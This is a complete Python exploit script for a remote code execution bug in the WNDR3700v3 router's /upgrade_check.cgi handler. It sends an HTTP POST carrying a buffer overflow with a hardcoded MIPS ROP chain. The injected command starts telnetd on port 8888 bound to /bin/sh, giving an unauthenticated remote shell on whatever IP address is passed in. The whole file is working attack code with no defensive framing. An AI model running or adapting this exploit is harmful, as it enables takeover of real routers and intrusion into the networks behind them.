import argparse, socket, struct

def p32(address):
	return struct.pack("<I", address)

def send(ip, port, payload):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	sock.close()

parser = argparse.ArgumentParser(description='Run the exploit')
parser.add_argument('ip', type=str, default=None, help='The IP address of the webserver to exploit')
parser.add_argument('-port', type=int, default=80, help='The port of the webserver to exploit')
args = parser.parse_args()

# WNDR3700v3 1.0.0.42
# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
# 2) gadget: set $fp to $sp, set $a0 to $sp+0x25, and calls memset
rop_gadget = [p32(0x610070+0x72c), p32(0x40BB10), p32(0x4206FC)]
command = "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh"

data = ""
data += "*#$^\x00" # marker
data += "\x00\x04\x00" # size
data += "A" * 0x60

data += "B" * 0x4     # Padding
data += "C" * 0x4     # fp
data += rop_gadget[1] # ra
data += "D" * 0x10    # Padding
data += rop_gadget[0] # gp
data += "E" * 0x8     # Padding
data += rop_gadget[2] # ra
data += "F" * 0x25    # Padding
data += command + "\x00" # Add the command and then NULL-terminate it
data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

payload = ''
payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
payload += 'Host: {}\r\n'.format(args.ip)
payload += 'Content-Disposition: AAAA\r\n'
payload += 'Content-Length: {}\r\n'.format(len(data))
payload += 'Content-Type: application/octet-stream\r\n'
payload += 'name="mtenFWUpload"\r\n'
payload += '\r\n'
payload += data

send(args.ip, args.port, payload)

